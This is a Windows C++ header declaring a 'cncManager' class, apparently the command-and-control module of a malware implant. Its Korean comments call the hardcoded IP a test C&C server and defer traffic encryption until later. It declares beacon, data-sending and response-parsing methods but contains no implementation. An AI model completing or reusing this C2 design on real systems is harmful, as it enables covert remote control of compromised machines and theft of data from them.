#pragma once
#include <Windows.h>
#include "DDproto.h"
#include <winhttp.h>

class cncManager
{
private:
	LPCWSTR
		/* 일단 C&C 정해지기 전이라 테스트용*/
		server = L"1.251.227.66",
		index = L"/tests";

	HINTERNET
		hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	BOOL bResults = FALSE;

public:
	cncManager();
	cncManager(LPCWSTR server);
	~cncManager();
	void responseParser(UCHAR* res, DWORD len);
	void sendHttpRequest(LPVOID data, DWORD dlen);
	void sendBeacon();
	void sendData(UCHAR DDtype, DWORD len, LPVOID stream);
	/* 암호화는 디버깅 편의를 위해서 마지막에 구현하는걸로 */
	LPVOID dataEncrypt(LPVOID data);
	LPVOID dataDecrypt(LPVOID data);

};
